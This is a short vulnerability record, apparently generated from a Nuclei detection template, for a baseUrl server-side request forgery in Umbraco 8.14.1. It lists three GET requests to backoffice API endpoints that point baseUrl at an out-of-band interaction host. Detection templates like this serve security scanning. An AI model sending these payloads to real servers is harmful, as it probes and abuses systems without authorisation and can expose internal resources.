# Vulnerability: Umbraco 8.14.1 - baseUrl Server-Side Request Forgery (SSRF)
**Classification:** CWE-918
**Source:** Nuclei Template (`umbraco-base-ssrf.yaml`)

## Description
Umbraco 8.1.4.1 allows attackers to use the baseUrl parameter to several programs to perform a server-side request forgery (SSRF) attack.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/umbraco/BackOffice/Api/Help/GetContextHelpForPage?section=content&tree=undefined&baseUrl=http://{{interactsh-url}}
GET {{BaseURL}}/umbraco/backoffice/UmbracoApi/Dashboard/GetRemoteDashboardContent?section=TryToAvoidGetCacheItem111&baseUrl=http://{{interactsh-url}}/
GET {{BaseURL}}/umbraco/backoffice/UmbracoApi/Dashboard/GetRemoteDashboardCss?section=AvoidGetCacheItem&baseUrl=http://{{interactsh-url}}/
```

